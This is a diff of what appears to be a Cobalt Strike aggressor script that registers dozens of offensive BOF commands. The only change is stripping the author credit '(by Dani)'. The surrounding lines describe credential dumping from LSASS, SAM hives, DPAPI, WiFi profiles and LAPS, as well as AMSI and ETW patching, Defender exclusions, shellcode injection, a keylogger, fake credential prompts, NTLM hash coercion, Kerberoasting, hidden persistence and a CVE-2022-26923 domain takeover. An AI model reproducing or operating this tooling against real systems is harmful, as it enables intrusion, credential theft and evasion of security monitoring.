@@ -31,7 +31,7 @@
 # LOAD-TIME BANNER
 # ============================================================
 println("============================================================");
-println("  DEF-Situational-Awareness-BOF  //  by Dani");
+println("  DEF-Situational-Awareness-BOF");
 println("  157 BOFs across 6 phases loaded");
 println("  Type 'dani-help' in a beacon for the full command list.");
 println("============================================================");
@@ -76,7 +76,7 @@ alias uptime {
 }
 beacon_command_register(
     "uptime",
-    "Uptime via KUSER_SHARED_DATA — T1082 (by Dani)",
+    "Uptime via KUSER_SHARED_DATA — T1082",
     "Synopsis: uptime\n\n" .
     "Description: Read system uptime directly from KUSER_SHARED_DATA without\n" .
     "calling GetTickCount or NtQuerySystemInformation. No API import.\n\n" .
@@ -90,7 +90,7 @@ alias hostname {
 }
 beacon_command_register(
     "hostname",
-    "NetBIOS/DNS/FQDN via DFR GetComputerNameExA — T1082 (by Dani)",
+    "NetBIOS/DNS/FQDN via DFR GetComputerNameExA — T1082",
     "Synopsis: hostname\n\n" .
     "Description: Enumerate hostname in all three forms (NetBIOS, DNS, FQDN)\n" .
     "using a Direct Function Resolution (DFR) call to GetComputerNameExA,\n" .
@@ -105,7 +105,7 @@ alias whoami {
 }
 beacon_command_register(
     "whoami",
-    "Token info via indirect NtOpenProcessToken — T1033/T1134 (by Dani)",
+    "Token info via indirect NtOpenProcessToken — T1033/T1134",
     "Synopsis: whoami\n\n" .
     "Description: Dump current process token information (user, groups, privileges,\n" .
     "integrity level) via an indirect syscall to NtOpenProcessToken. Uses HalosGate\n" .
@@ -127,7 +127,7 @@ alias arp {
 }
 beacon_command_register(
     "arp",
-    "ARP cache enumeration — T1018 (by Dani)",
+    "ARP cache enumeration — T1018",
     "Synopsis: arp\n\n" .
     "Description: Dump the local ARP cache to discover adjacent hosts on\n" .
     "the same subnet without generating network traffic.\n\n" .
@@ -141,7 +141,7 @@ alias env {
 }
 beacon_command_register(
     "env",
-    "Environment variables via PEB walk — T1082 (by Dani)",
+    "Environment variables via PEB walk — T1082",
     "Synopsis: env\n\n" .
     "Description: Enumerate all process environment variables by walking the\n" .
     "Process Environment Block (PEB) directly. No GetEnvironmentStrings call.\n\n" .
@@ -155,7 +155,7 @@ alias ipconfig {
 }
 beacon_command_register(
     "ipconfig",
-    "Network adapter info — T1016 (by Dani)",
+    "Network adapter info — T1016",
     "Synopsis: ipconfig\n\n" .
     "Description: Enumerate all network adapters, IP addresses, subnets,\n" .
     "gateways, and DNS servers via GetAdaptersInfo.\n\n" .
@@ -169,7 +169,7 @@ alias netstat {
 }
 beacon_command_register(
     "netstat",
-    "TCP/UDP connections — T1049 (by Dani)",
+    "TCP/UDP connections — T1049",
     "Synopsis: netstat\n\n" .
     "Description: List all active TCP and UDP endpoints on the host,\n" .
     "including remote addresses and owning PIDs.\n\n" .
@@ -188,7 +188,7 @@ alias netuser {
 }
 beacon_command_register(
     "netuser",
-    "Local/domain user enumeration — T1087.001/T1087.002 (by Dani)",
+    "Local/domain user enumeration — T1087.001/T1087.002",
     "Synopsis: netuser [hostname]\n\n" .
     "Description: Enumerate local and domain user accounts. Optionally target\n" .
     "a remote host. Without a hostname, enumerates the local machine.\n\n" .
@@ -211,7 +211,7 @@ alias netshare {
 }
 beacon_command_register(
     "netshare",
-    "SMB share enumeration — T1135 (by Dani)",
+    "SMB share enumeration — T1135",
     "Synopsis: netshare [hostname]\n\n" .
     "Description: List SMB network shares on the local or a remote host.\n\n" .
     "Examples:\n" .
@@ -232,7 +232,7 @@ alias netloggedon {
 }
 beacon_command_register(
     "netloggedon",
-    "Logged-on users — T1033 (by Dani)",
+    "Logged-on users — T1033",
     "Synopsis: netloggedon [hostname]\n\n" .
     "Description: Enumerate users currently logged on to the local or a\n" .
     "remote host via NetWkstaUserEnum.\n\n" .
@@ -249,7 +249,7 @@ alias tasklist {
 }
 beacon_command_register(
     "tasklist",
-    "Process list via indirect NtQuerySystemInformation — T1057 (by Dani)",
+    "Process list via indirect NtQuerySystemInformation — T1057",
     "Synopsis: tasklist\n\n" .
     "Description: Enumerate all running processes (name, PID, PPID, session,\n" .
     "architecture) via an indirect syscall to NtQuerySystemInformation.\n\n" .
@@ -270,7 +270,7 @@ alias schtasksquery {
 }
 beacon_command_register(
     "schtasksquery",
-    "Scheduled tasks via COM — T1053.005/T1518 (by Dani)",
+    "Scheduled tasks via COM — T1053.005/T1518",
     "Synopsis: schtasksquery [hostname] [taskpath]\n\n" .
     "Description: Enumerate scheduled tasks using the Task Scheduler COM interface\n" .
     "(ITaskService). Optionally target a remote host and/or specific task folder.\n\n" .
@@ -298,7 +298,7 @@ alias reg-query {
 }
 beacon_command_register(
     "reg-query",
-    "Registry key read — T1012 (by Dani)",
+    "Registry key read — T1012",
     "Synopsis: reg-query <hive> <subkey>\n\n" .
     "Description: Read all values from the specified registry key.\n" .
     "Hive must be one of: HKLM, HKCU, HKCR, HKU, HKCC\n\n" .
@@ -320,7 +320,7 @@ alias windowlist {
 }
 beacon_command_register(
     "windowlist",
-    "Window enumeration — T1010 (by Dani)",
+    "Window enumeration — T1010",
     "Synopsis: windowlist [visible-only:0|1]\n\n" .
     "Description: Enumerate top-level windows and their owning processes.\n" .
     "Pass 1 to list only visible windows; 0 (default) for all windows.\n\n" .
@@ -337,7 +337,7 @@ alias routeprint {
 }
 beacon_command_register(
     "routeprint",
-    "Routing table enumeration — T1016 (by Dani)",
+    "Routing table enumeration — T1016",
     "Synopsis: routeprint\n\n" .
     "Description: Dump the IPv4 routing table via GetIpForwardTable.\n\n" .
     "MITRE ATT&CK: T1016 (System Network Configuration Discovery)\n\n" .
@@ -361,7 +361,7 @@ alias ldapsearch {
 }
 beacon_command_register(
     "ldapsearch",
-    "LDAP query — T1087.002/T1018 (by Dani)",
+    "LDAP query — T1087.002/T1018",
     "Synopsis: ldapsearch <basedn> <filter> [attrs]\n\n" .
     "Description: Execute an LDAP search against the domain controller using\n" .
     "paged results. Returns matching objects with requested attributes.\n\n" .
@@ -388,7 +388,7 @@ alias nonpaged-ldapsearch {
 }
 beacon_command_register(
     "nonpaged-ldapsearch",
-    "Non-paged LDAP query — T1087.002 (by Dani)",
+    "Non-paged LDAP query — T1087.002",
     "Synopsis: nonpaged-ldapsearch <basedn> <filter>\n\n" .
     "Description: Execute an LDAP search without paging controls — useful when\n" .
     "paged LDAP is restricted or for quick small result sets.\n\n" .
@@ -404,7 +404,7 @@ alias adcs-enum-com {
 }
 beacon_command_register(
     "adcs-enum-com",
-    "ADCS certificate template enumeration via COM — T1518.001 (by Dani)",
+    "ADCS certificate template enumeration via COM — T1518.001",
     "Synopsis: adcs-enum-com\n\n" .
     "Description: Enumerate Active Directory Certificate Services (ADCS)\n" .
     "certificate templates via the ICertConfig COM interface without\n" .
@@ -419,7 +419,7 @@ alias list-firewall {
 }
 beacon_command_register(
     "list-firewall",
-    "Windows Firewall rules enumeration — T1518.001 (by Dani)",
+    "Windows Firewall rules enumeration — T1518.001",
     "Synopsis: list-firewall\n\n" .
     "Description: Enumerate all Windows Firewall rules (name, direction, action,\n" .
     "protocol, ports, enabled state) via the INetFwRules COM interface.\n\n" .
@@ -433,7 +433,7 @@ alias enum-filter-driver {
 }
 beacon_command_register(
     "enum-filter-driver",
-    "Mini-filter driver enumeration — T1518.001/T1014 (by Dani)",
+    "Mini-filter driver enumeration — T1518.001/T1014",
     "Synopsis: enum-filter-driver\n\n" .
     "Description: Enumerate installed Windows mini-filter drivers via\n" .
     "FilterFindFirst/FilterFindNext. Identifies EDR/AV kernel drivers.\n\n" .
@@ -457,7 +457,7 @@ alias wmi-query {
 }
 beacon_command_register(
     "wmi-query",
-    "WMI query execution — T1047 (by Dani)",
+    "WMI query execution — T1047",
     "Synopsis: wmi-query <namespace> <wql>\n\n" .
     "Description: Execute an arbitrary WMI query via IWbemServices.\n\n" .
     "Examples:\n" .
@@ -473,7 +473,7 @@ alias get-dpapi-system {
 }
 beacon_command_register(
     "get-dpapi-system",
-    "DPAPI system master key extraction — T1555.004 (by Dani)",
+    "DPAPI system master key extraction — T1555.004",
     "Synopsis: get-dpapi-system\n\n" .
     "Description: Extract the DPAPI system master key from LSASS memory.\n" .
     "Requires SYSTEM or SeDebugPrivilege. Output can be used to decrypt\n" .
@@ -488,7 +488,7 @@ alias clipboard {
 }
 beacon_command_register(
     "clipboard",
-    "Clipboard content dump — T1115 (by Dani)",
+    "Clipboard content dump — T1115",
     "Synopsis: clipboard\n\n" .
     "Description: Read the current text content of the Windows clipboard\n" .
     "via OpenClipboard/GetClipboardData.\n\n" .
@@ -502,7 +502,7 @@ alias dnscache {
 }
 beacon_command_register(
     "dnscache",
-    "DNS resolver cache dump — T1016.001 (by Dani)",
+    "DNS resolver cache dump — T1016.001",
     "Synopsis: dnscache\n\n" .
     "Description: Dump the Windows DNS resolver cache entries to reveal\n" .
     "recently resolved hostnames — useful for mapping internal infrastructure.\n\n" .
@@ -516,7 +516,7 @@ alias driversigs {
 }
 beacon_command_register(
     "driversigs",
-    "Loaded driver signature check — T1518.001 (by Dani)",
+    "Loaded driver signature check — T1518.001",
     "Synopsis: driversigs\n\n" .
     "Description: Enumerate all loaded kernel drivers and check their digital\n" .
     "signatures to identify unsigned or suspicious drivers.\n\n" .
@@ -539,7 +539,7 @@ alias findmodule {
 }
 beacon_command_register(
     "findmodule",
-    "Find module in remote process — T1057 (by Dani)",
+    "Find module in remote process — T1057",
     "Synopsis: findmodule <pid> <modulename>\n\n" .
     "Description: Check whether a specific DLL/module is loaded in a\n" .
     "target process by PID. Useful for detecting security product DLLs\n" .
@@ -557,7 +557,7 @@ alias sccm-decrypt {
 }
 beacon_command_register(
     "sccm-decrypt",
-    "SCCM NAA credential decryption — T1555 (by Dani)",
+    "SCCM NAA credential decryption — T1555",
     "Synopsis: sccm-decrypt\n\n" .
     "Description: Decrypt SCCM Network Access Account (NAA) credentials\n" .
     "stored in the WMI repository using the DPAPI machine key.\n\n" .
@@ -571,7 +571,7 @@ alias ldapsec-check {
 }
 beacon_command_register(
     "ldapsec-check",
-    "LDAP signing/channel-binding probe — T1518 (by Dani)",
+    "LDAP signing/channel-binding probe — T1518",
     "Synopsis: ldapsec-check\n\n" .
     "Description: Probe the domain controller to determine whether LDAP\n" .
     "signing and channel binding are required or optional. Identifies\n" .
@@ -599,7 +599,7 @@ alias probe {
 }
 beacon_command_register(
     "probe",
-    "TCP port probe — hostname/IPv4/CIDR + multi-port — T1046 (by Dani)",
+    "TCP port probe — hostname/IPv4/CIDR + multi-port — T1046",
     "Synopsis: probe <host-or-ip-or-cidr> <ports> [timeout-ms]\n\n" .
     "Description: Probe TCP ports on a hostname (DNS-resolved), single IPv4,\n" .
     "or CIDR range. Like portscan but adds hostname resolution via getaddrinfo.\n\n" .
@@ -629,7 +629,7 @@ alias aadjoininfo {
 }
 beacon_command_register(
     "aadjoininfo",
-    "Azure AD join status — T1518 (by Dani)",
+    "Azure AD join status — T1518",
     "Synopsis: aadjoininfo\n\n" .
     "Description: Query Azure AD join status of the host via\n" .
     "NetGetAadJoinInformation. Reports join type, tenant ID, and device ID.\n\n" .
@@ -653,7 +653,7 @@ alias nslookup {
 }
 beacon_command_register(
     "nslookup",
-    "DNS query via DnsQuery_A — T1018/T1016.001 (by Dani)",
+    "DNS query via DnsQuery_A — T1018/T1016.001",
     "Synopsis: nslookup <name> [type=A]\n\n" .
     "Description: Perform a DNS query from the beacon context. Supports A,\n" .
     "AAAA, MX, NS, TXT, PTR record types.\n\n" .
@@ -672,7 +672,7 @@ alias listmods {
 }
 beacon_command_register(
     "listmods",
-    "List loaded modules via PEB walk — T1057 (by Dani)",
+    "List loaded modules via PEB walk — T1057",
     "Synopsis: listmods\n\n" .
     "Description: Enumerate all DLLs loaded in the current beacon process\n" .
     "by walking PEB.Ldr InLoadOrderModuleList. No API call — pure PEB walk.\n\n" .
@@ -694,7 +694,7 @@ alias cacls {
 }
 beacon_command_register(
     "cacls",
-    "File ACLs as SDDL via GetNamedSecurityInfo — T1083 (by Dani)",
+    "File ACLs as SDDL via GetNamedSecurityInfo — T1083",
     "Synopsis: cacls <filepath>\n\n" .
     "Description: Print the DACL/owner of a file or directory as an SDDL\n" .
     "string using GetNamedSecurityInfoA + ConvertSecurityDescriptorToString.\n\n" .
@@ -719,7 +719,7 @@ alias dir {
 }
 beacon_command_register(
     "dir",
-    "Directory listing via FindFirstFile — T1083 (by Dani)",
+    "Directory listing via FindFirstFile — T1083",
     "Synopsis: dir <path>\n\n" .
     "Description: List files and directories at the specified path using\n" .
     "FindFirstFileA/FindNextFileA. Prints type, size, and filename.\n\n" .
@@ -744,7 +744,7 @@ alias get-netsession {
 }
 beacon_command_register(
     "get-netsession",
-    "NetSession enumeration via NetSessionEnum — T1049 (by Dani)",
+    "NetSession enumeration via NetSessionEnum — T1049",
     "Synopsis: get-netsession <hostname>\n\n" .
     "Description: List open SMB sessions on a target host using\n" .
     "NetSessionEnum (level 10). Shows client, user, time, and idle time.\n\n" .
@@ -766,7 +766,7 @@ alias netgroup {
 }
 beacon_command_register(
     "netgroup",
-    "Domain groups via NetGroupEnum — T1069.002 (by Dani)",
+    "Domain groups via NetGroupEnum — T1069.002",
     "Synopsis: netgroup [domain]\n\n" .
     "Description: Enumerate domain global groups via NetGroupEnum (level 0).\n" .
     "Optionally target a specific domain; defaults to the current domain.\n\n" .
@@ -788,7 +788,7 @@ alias netlocalgroup {
 }
 beacon_command_register(
     "netlocalgroup",
-    "Local groups via NetLocalGroupEnum — T1069.001 (by Dani)",
+    "Local groups via NetLocalGroupEnum — T1069.001",
     "Synopsis: netlocalgroup [hostname]\n\n" .
     "Description: Enumerate local groups via NetLocalGroupEnum (level 0).\n" .
     "Optionally target a remote hostname; defaults to local machine.\n\n" .
@@ -810,7 +810,7 @@ alias get-password-policy {
 }
 beacon_command_register(
     "get-password-policy",
-    "Domain password policy via NetUserModalsGet — T1201 (by Dani)",
+    "Domain password policy via NetUserModalsGet — T1201",
     "Synopsis: get-password-policy [domain]\n\n" .
     "Description: Retrieve the domain password policy (min length, max age,\n" .
     "min age, lockout, history) via NetUserModalsGet (level 0).\n\n" .
@@ -835,7 +835,7 @@ alias sc-query {
 }
 beacon_command_register(
     "sc-query",
-    "Service config + status via SCM — T1007 (by Dani)",
+    "Service config + status via SCM — T1007",
     "Synopsis: sc-query <servicename>\n\n" .
     "Description: Query service configuration and current status via\n" .
     "OpenSCManager/OpenService/QueryServiceConfigA/QueryServiceStatusEx.\n" .
@@ -854,7 +854,7 @@ alias schtasksenum {
 }
 beacon_command_register(
     "schtasksenum",
-    "Scheduled task enumeration via COM ITaskService — T1053.005 (by Dani)",
+    "Scheduled task enumeration via COM ITaskService — T1053.005",
     "Synopsis: schtasksenum\n\n" .
     "Description: Enumerate scheduled tasks in the root folder using the\n" .
     "Task Scheduler COM interface (ITaskService/ITaskFolder/GetTasks).\n" .
@@ -869,7 +869,7 @@ alias useridletime {
 }
 beacon_command_register(
     "useridletime",
-    "User idle time via GetLastInputInfo — T1010 (by Dani)",
+    "User idle time via GetLastInputInfo — T1010",
     "Synopsis: useridletime\n\n" .
     "Description: Report how long the interactive user has been idle by\n" .
     "reading GetLastInputInfo and computing elapsed ticks since last input.\n" .
@@ -907,7 +907,7 @@ alias portscan {
 }
 beacon_command_register(
     "portscan",
-    "TCP port scanner — IPv4/CIDR + multi-port — T1046 (by Dani)",
+    "TCP port scanner — IPv4/CIDR + multi-port — T1046",
     "Synopsis: portscan <ip-or-cidr> <ports> [timeout-ms]\n\n" .
     "Description: Non-blocking TCP connect-scan against a single IPv4 or a\n" .
     "CIDR range (max /20 = 4096 hosts). Ports accept space/comma delimiters\n" .
@@ -939,7 +939,7 @@ alias etw-patch {
 }
 beacon_command_register(
     "etw-patch",
-    "Patch EtwEventWrite to blind ETW — T1562.006 (by Dani)",
+    "Patch EtwEventWrite to blind ETW — T1562.006",
     "Synopsis: etw-patch\n\n" .
     "Description: Overwrite the first bytes of EtwEventWrite in ntdll.dll\n" .
     "with a RET instruction to disable ETW event emission from the current\n" .
@@ -954,7 +954,7 @@ alias amsi-patch {
 }
 beacon_command_register(
     "amsi-patch",
-    "Patch AmsiScanBuffer to bypass AMSI — T1562.001 (by Dani)",
+    "Patch AmsiScanBuffer to bypass AMSI — T1562.001",
     "Synopsis: amsi-patch\n\n" .
     "Description: Overwrite AmsiScanBuffer in amsi.dll to always return\n" .
     "AMSI_RESULT_CLEAN, bypassing Antimalware Scan Interface checks in\n" .
@@ -977,7 +977,7 @@ alias enablepriv {
 }
 beacon_command_register(
     "enablepriv",
-    "Enable token privilege — T1134.002 (by Dani)",
+    "Enable token privilege — T1134.002",
     "Synopsis: enablepriv <privname>\n\n" .
     "Description: Enable a specific privilege in the current process token\n" .
     "using NtAdjustPrivilegesToken.\n\n" .
@@ -1004,7 +1004,7 @@ alias procdump {
 }
 beacon_command_register(
     "procdump",
-    "MiniDump process memory — T1003.001 (by Dani)",
+    "MiniDump process memory — T1003.001",
     "Synopsis: procdump <pid> <outpath>\n\n" .
     "Description: Create a MiniDump of the target process to disk using\n" .
     "MiniDumpWriteDump. Typical use is lsass.exe (PID varies) for\n" .
@@ -1032,7 +1032,7 @@ alias ghost-task {
 }
 beacon_command_register(
     "ghost-task",
-    "Hidden scheduled task creation — T1053.005 (by Dani)",
+    "Hidden scheduled task creation — T1053.005",
     "Synopsis: ghost-task <name> <cmdpath> [remove]\n\n" .
     "Description: Create a scheduled task with a hidden/ghost registration\n" .
     "that does not appear in schtasks output by manipulating the task XML\n" .
@@ -1060,7 +1060,7 @@ alias reg-save {
 }
 beacon_command_register(
     "reg-save",
-    "Registry hive dump — T1003.002/T1012 (by Dani)",
+    "Registry hive dump — T1003.002/T1012",
     "Synopsis: reg-save <hive> <subkey> <outpath>\n\n" .
     "Description: Save a registry hive or subkey to a file on disk using\n" .
     "RegSaveKey. Typically used to dump SAM, SECURITY, and SYSTEM hives\n" .
@@ -1089,7 +1089,7 @@ alias sc-create {
 }
 beacon_command_register(
     "sc-create",
-    "Create Windows service — T1543.003 (by Dani)",
+    "Create Windows service — T1543.003",
     "Synopsis: sc-create <name> <binpath>\n\n" .
     "Description: Create a new Windows service with the specified name and\n" .
     "binary path using OpenSCManager/CreateService.\n\n" .
@@ -1113,7 +1113,7 @@ alias sc-delete {
 }
 beacon_command_register(
     "sc-delete",
-    "Delete Windows service — T1489 (by Dani)",
+    "Delete Windows service — T1489",
     "Synopsis: sc-delete <name>\n\n" .
     "Description: Delete an existing Windows service by name using\n" .
     "OpenSCManager/DeleteService.\n\n" .
@@ -1140,7 +1140,7 @@ alias adduser {
 }
 beacon_command_register(
     "adduser",
-    "Create local user account — T1136.001 (by Dani)",
+    "Create local user account — T1136.001",
     "Synopsis: adduser <username> <password> [admin]\n\n" .
     "Description: Create a new local user account. Pass 'admin' as the\n" .
     "third argument to add the user to the local Administrators group.\n\n" .
@@ -1167,7 +1167,7 @@ alias make-token {
 }
 beacon_command_register(
     "make-token",
-    "Create impersonation token — T1134.003 (by Dani)",
+    "Create impersonation token — T1134.003",
     "Synopsis: make-token <domain> <username> <password>\n\n" .
     "Description: Create a new logon token for the specified credentials\n" .
     "using LogonUser (LOGON32_LOGON_NEW_CREDENTIALS) and apply it to\n" .
@@ -1196,7 +1196,7 @@ alias shspawnas {
 }
 beacon_command_register(
     "shspawnas",
-    "Spawn process as another user — T1134.002 (by Dani)",
+    "Spawn process as another user — T1134.002",
     "Synopsis: shspawnas <domain> <username> <password> <cmd>\n\n" .
     "Description: Spawn a child process under alternate credentials using\n" .
     "CreateProcessWithLogonW (shell execute equivalent). Useful for\n" .
@@ -1222,7 +1222,7 @@ alias suspendresume {
 }
 beacon_command_register(
     "suspendresume",
-    "Suspend or resume a process — T1055 (by Dani)",
+    "Suspend or resume a process — T1055",
     "Synopsis: suspendresume <pid> <suspend|resume>\n\n" .
     "Description: Suspend or resume all threads in the target process\n" .
     "using NtSuspendProcess/NtResumeProcess. Useful for freezing EDR\n" .
@@ -1248,7 +1248,7 @@ alias global-unprotect {
 }
 beacon_command_register(
     "global-unprotect",
-    "DPAPI CryptUnprotectData (Chrome cookies) — T1555.003 (by Dani)",
+    "DPAPI CryptUnprotectData (Chrome cookies) — T1555.003",
     "Synopsis: global-unprotect <ciphertext-hex>\n\n" .
     "Description: Decrypt a DPAPI-protected blob using CryptUnprotectData\n" .
     "with CRYPTPROTECT_LOCAL_MACHINE. Used to decrypt Chrome 'v10'+ cookies\n" .
@@ -1272,7 +1272,7 @@ alias inject-crt {
 }
 beacon_command_register(
     "inject-crt",
-    "CreateRemoteThread shellcode injection — T1055.002 (by Dani)",
+    "CreateRemoteThread shellcode injection — T1055.002",
     "Synopsis: inject-crt <pid> <shellcode-hex>\n\n" .
     "Description: Inject shellcode into a remote process using the classic\n" .
     "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread technique.\n\n" .
@@ -1297,7 +1297,7 @@ alias inject-ntcreate {
 }
 beacon_command_register(
     "inject-ntcreate",
-    "NtCreateThreadEx shellcode injection — T1055 (by Dani)",
+    "NtCreateThreadEx shellcode injection — T1055",
     "Synopsis: inject-ntcreate <pid> <shellcode-hex>\n\n" .
     "Description: Inject shellcode into a remote process using\n" .
     "NtCreateThreadEx — a lower-level alternative to CreateRemoteThread\n" .
@@ -1323,7 +1323,7 @@ alias inject-apc {
 }
 beacon_command_register(
     "inject-apc",
-    "APC queue shellcode injection — T1055.004 (by Dani)",
+    "APC queue shellcode injection — T1055.004",
     "Synopsis: inject-apc <pid> <shellcode-hex>\n\n" .
     "Description: Inject shellcode via Asynchronous Procedure Call (APC)\n" .
     "queued to all alertable threads in the target process. Executes\n" .
@@ -1349,7 +1349,7 @@ alias inject-ktable {
 }
 beacon_command_register(
     "inject-ktable",
-    "KernelCallbackTable hijack injection — T1055 (by Dani)",
+    "KernelCallbackTable hijack injection — T1055",
     "Synopsis: inject-ktable <pid> <shellcode-hex>\n\n" .
     "Description: Inject shellcode by overwriting a function pointer in\n" .
     "the target process's KernelCallbackTable (PEB+0x58), triggered by\n" .
@@ -1381,7 +1381,7 @@ alias inject-poolparty {
 }
 beacon_command_register(
     "inject-poolparty",
-    "Thread-pool (PoolParty) injection — T1055 (by Dani)",
+    "Thread-pool (PoolParty) injection — T1055",
     "Synopsis: inject-poolparty <pid> <shellcode-hex>\n\n" .
     "Description: Inject shellcode using the PoolParty technique — abuses\n" .
     "Windows thread-pool worker factory objects to execute code in a\n" .
@@ -1407,7 +1407,7 @@ alias execute-crosssession {
 }
 beacon_command_register(
     "execute-crosssession",
-    "Cross-session execution via COM — T1021.003 (by Dani)",
+    "Cross-session execution via COM — T1021.003",
     "Synopsis: execute-crosssession <sessionid> <cmd>\n\n" .
     "Description: Execute a command in another desktop session by abusing\n" .
     "the IShellWindows/IShellBrowser COM interface to obtain a shell\n" .
@@ -1433,7 +1433,7 @@ alias dcom-localserver32 {
 }
 beacon_command_register(
     "dcom-localserver32",
-    "DCOM lateral movement via LocalServer32 — T1021.003 (by Dani)",
+    "DCOM lateral movement via LocalServer32 — T1021.003",
     "Synopsis: dcom-localserver32 <host> <clsid>\n\n" .
     "Description: Abuse a DCOM LocalServer32 COM object to execute commands\n" .
     "on a remote host. Uses CoCreateInstanceEx for remote object instantiation.\n\n" .
@@ -1449,7 +1449,7 @@ alias keylogger-rawinput {
 }
 beacon_command_register(
     "keylogger-rawinput",
-    "Raw Input API keylogger — T1056.001 (by Dani)",
+    "Raw Input API keylogger — T1056.001",
     "Synopsis: keylogger-rawinput\n\n" .
     "Description: Start a keylogger using the Windows Raw Input API\n" .
     "(RegisterRawInputDevices) to capture keystrokes at the message loop level\n" .
@@ -1464,7 +1464,7 @@ alias enum-sec-products {
 }
 beacon_command_register(
     "enum-sec-products",
-    "AV/EDR product detection — T1518.001 (by Dani)",
+    "AV/EDR product detection — T1518.001",
     "Synopsis: enum-sec-products\n\n" .
     "Description: Enumerate installed security products (AV, EDR, NGAV)\n" .
     "by querying the SecurityCenter2 WMI namespace and checking known\n" .
@@ -1479,7 +1479,7 @@ alias enum-sysmon {
 }
 beacon_command_register(
     "enum-sysmon",
-    "Sysmon installation and config detection — T1518.001 (by Dani)",
+    "Sysmon installation and config detection — T1518.001",
     "Synopsis: enum-sysmon\n\n" .
     "Description: Detect Sysmon presence by checking the driver service,\n" .
     "registry keys, and event log channels. Attempts to identify the\n" .
@@ -1496,7 +1496,7 @@ alias spn {
 }
 beacon_command_register(
     "spn",
-    "SPN enumeration (Kerberoast prep) — T1558.003 (by Dani)",
+    "SPN enumeration (Kerberoast prep) — T1558.003",
     "Synopsis: spn\n\n" .
     "Description: Enumerate all Service Principal Names (SPNs) registered\n" .
     "in the domain via LDAP — identifies Kerberoastable service accounts.\n\n" .
@@ -1511,7 +1511,7 @@ alias wifi-passwords {
 }
 beacon_command_register(
     "wifi-passwords",
-    "WLAN profile password dump — T1555 (by Dani)",
+    "WLAN profile password dump — T1555",
     "Synopsis: wifi-passwords\n\n" .
     "Description: Enumerate all saved WLAN profiles and extract their\n" .
     "plaintext passphrases using WlanGetProfile with WLAN_PROFILE_GET_PLAINTEXT_KEY.\n\n" .
@@ -1532,7 +1532,7 @@ alias cred-prompt {
 }
 beacon_command_register(
     "cred-prompt",
-    "Credential UI dialog prompt — T1056.002 (by Dani)",
+    "Credential UI dialog prompt — T1056.002",
     "Synopsis: cred-prompt [title] [message]\n\n" .
     "Description: Display a Windows credential prompt dialog\n" .
     "(CredUIPromptForWindowsCredentials) and capture the entered username\n" .
@@ -1558,7 +1558,7 @@ alias add-exclusion {
 }
 beacon_command_register(
     "add-exclusion",
-    "Add Windows Defender path exclusion — T1562.001 (by Dani)",
+    "Add Windows Defender path exclusion — T1562.001",
     "Synopsis: add-exclusion <path>\n\n" .
     "Description: Add a path or file exclusion to Windows Defender using\n" .
     "the IWbemServices WMI interface (MSFT_MpPreference). Requires admin.\n\n" .
@@ -1583,7 +1583,7 @@ alias capture-netntlm {
 }
 beacon_command_register(
     "capture-netntlm",
-    "Force NetNTLMv2 hash capture via UNC — T1187 (by Dani)",
+    "Force NetNTLMv2 hash capture via UNC — T1187",
     "Synopsis: capture-netntlm <unc-path>\n\n" .
     "Description: Force the host to authenticate to a UNC path to capture\n" .
     "the NetNTLMv2 hash (for relay or crack). Ensure Responder/ntlmrelayx\n" .
@@ -1608,7 +1608,7 @@ alias authenticate-http {
 }
 beacon_command_register(
     "authenticate-http",
-    "Force outbound NTLM HTTP authentication — T1187 (by Dani)",
+    "Force outbound NTLM HTTP authentication — T1187",
     "Synopsis: authenticate-http <url>\n\n" .
     "Description: Force the host to perform NTLM authentication to an HTTP\n" .
     "endpoint, capturing the NetNTLMv2 hash. Pair with Responder in\n" .
@@ -1631,7 +1631,7 @@ alias psx {
 }
 beacon_command_register(
     "psx",
-    "Process + token + security products (indirect syscalls) — T1057/T1134 (by Dani)",
+    "Process + token + security products (indirect syscalls) — T1057/T1134",
     "Synopsis: psx\n\n" .
     "Description: Comprehensive process enumeration combining process list,\n" .
     "token information, and security product identification. Uses indirect\n" .
@@ -1646,7 +1646,7 @@ alias psk {
 }
 beacon_command_register(
     "psk",
-    "Kernel drivers + security product enumeration — T1518.001/T1057 (by Dani)",
+    "Kernel drivers + security product enumeration — T1518.001/T1057",
     "Synopsis: psk\n\n" .
     "Description: Enumerate loaded kernel drivers alongside process information\n" .
     "to identify security product drivers and EDR kernel components.\n\n" .
@@ -1661,7 +1661,7 @@ alias psm {
 }
 beacon_command_register(
     "psm",
-    "Process modules via PEB walk — T1057/T1016 (by Dani)",
+    "Process modules via PEB walk — T1057/T1016",
     "Synopsis: psm\n\n" .
     "Description: Enumerate all loaded modules (DLLs) in running processes\n" .
     "by walking the Process Environment Block (PEB) loader data tables.\n" .
@@ -1676,7 +1676,7 @@ alias findobjects {
 }
 beacon_command_register(
     "findobjects",
-    "Find safe injection target processes — T1057 (by Dani)",
+    "Find safe injection target processes — T1057",
     "Synopsis: findobjects\n\n" .
     "Description: Identify processes suitable for injection by filtering\n" .
     "for same-architecture, same-session, unprotected processes that\n" .
@@ -1692,7 +1692,7 @@ alias kerberoast {
 }
 beacon_command_register(
     "kerberoast",
-    "Request Kerberos service ticket for roasting — T1558.003 (by Dani)",
+    "Request Kerberos service ticket for roasting — T1558.003",
     "Synopsis: kerberoast\n\n" .
     "Description: Request Kerberos TGS tickets for enumerated SPNs and\n" .
     "output them in hashcat-compatible format for offline cracking.\n\n" .
@@ -1708,7 +1708,7 @@ alias lapsdump {
 }
 beacon_command_register(
     "lapsdump",
-    "LAPS password dump from AD — T1555 (by Dani)",
+    "LAPS password dump from AD — T1555",
     "Synopsis: lapsdump\n\n" .
     "Description: Extract Local Administrator Password Solution (LAPS)\n" .
     "passwords from Active Directory for all computer objects where the\n" .
@@ -1723,7 +1723,7 @@ alias wdtoggle {
 }
 beacon_command_register(
     "wdtoggle",
-    "Enable WDigest credential caching — T1003.001/T1112 (by Dani)",
+    "Enable WDigest credential caching — T1003.001/T1112",
     "Synopsis: wdtoggle\n\n" .
     "Description: Set HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\n" .
     "\\WDigest\\UseLogonCredential to 1 to enable WDigest authentication,\n" .
@@ -1749,7 +1749,7 @@ alias cve-2022-26923 {
 }
 beacon_command_register(
     "cve-2022-26923",
-    "AD CS dNSHostName spoofing — T1068 (by Dani)",
+    "AD CS dNSHostName spoofing — T1068",
     "Synopsis: cve-2022-26923 <machineacct> <password>\n\n" .
     "Description: Exploit CVE-2022-26923 (Certifried) — set a machine account's\n" .
     "dNSHostName to match a DC to obtain a DC certificate, enabling full domain\n" .
@@ -1764,7 +1764,7 @@ beacon_command_register(
 
 # ============================================================
 # ============================================================
